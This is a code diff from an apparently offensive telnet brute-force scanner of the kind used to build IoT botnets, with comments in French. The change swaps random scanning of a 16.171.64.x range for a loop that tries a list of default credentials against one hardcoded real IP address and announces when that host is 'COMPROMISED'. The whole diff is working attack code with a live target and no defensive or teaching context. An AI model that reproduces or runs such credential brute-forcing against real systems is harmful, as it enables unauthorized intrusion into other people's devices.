@@ -107,15 +107,16 @@ void auto_scan_range(char *start_ip, char *end_ip)
     printf("\n[*] %d IPs queued.\n", total);
 }
 
-void auto_scan_random(void)
+void auto_scan_single_ip(void)
 {
     struct telnet_info info;
     uint32_t total = 0;
-    int max_scans = 1000;
+    
+    // L'IP cible
+    char *target_ip = "16.171.64.211";  // Changez ici
     
     // Liste des credentials à tester
     char *credentials[] = {
-        "root:root",
         "root:admin",
         "root:12345",
         "root:password",
@@ -127,6 +128,7 @@ void auto_scan_random(void)
         "admin:default",
         "user:user",
         "user:password",
+        "root:root",
         "root:123456",
         "root:abc123",
         "administrator:administrator",
@@ -143,34 +145,47 @@ void auto_scan_random(void)
     };
     int cred_count = sizeof(credentials) / sizeof(credentials[0]);
     
-    srand(time(NULL));
-    printf("Generating %d random IPs in 16.171.x.x\n\n", max_scans); 
+    printf("=== TESTING SINGLE IP: %s ===\n", target_ip);
+    printf("Testing %d credentials...\n\n", cred_count);
     
-    for (int i = 0; i < max_scans; i++)
+    for (int c = 0; c < cred_count; c++)
     {
         char strbuf[128];
-        uint8_t o3 = rand() % 256;
-        uint8_t o4 = (rand() % 254) + 1;
         
-        // Sélectionner un credential aléatoire
-        int cred_index = rand() % cred_count;
-        
-        snprintf(strbuf, sizeof(strbuf), "16.171.64.%d:23 %s", o4, credentials[cred_index]);
+        // Construire la chaîne IP:port user:pass
+        snprintf(strbuf, sizeof(strbuf), "%s:23 %s", target_ip, credentials[c]);
         
         memset(&info, 0, sizeof(struct telnet_info));
+        
         if (telnet_info_parse(strbuf, &info) != NULL)
         {
-            server_queue_telnet(srv, &info);
-            total++;
-            printf("[%4d] Queued: 16.171.64.%d:%d with %s\n", 
-                   total, o3, o4, credentials[cred_index]);
-            usleep(20000);
+            // Tenter la connexion
+            if (server_queue_telnet(srv, &info) == SUCCESS)
+            {
+                total++;
+                printf("[✓] SUCCESS: %s with %s\n", target_ip, credentials[c]);
+                printf("[✓] IP %s is COMPROMISED!\n", target_ip);
+                break; // Arrêter si succès
+            }
+            else
+            {
+                printf("[✗] FAILED: %s with %s\n", target_ip, credentials[c]);
+            }
         }
+        else
+        {
+            printf("[!] PARSE ERROR: %s\n", strbuf);
+        }
+        
+        usleep(10000); // 10ms entre chaque tentative
     }
     
-    printf("\n[*] %d IPs queued.\n", total);
+    if (total == 0) {
+        printf("\n[✗] All %d credentials failed for %s\n", cred_count, target_ip);
+    } else {
+        printf("\n[✓] %s successfully compromised with %d credentials tested\n", target_ip, cred_count);
+    }
 }
-
 // ==================== MAIN ====================
 
 int main(int argc, char **args)
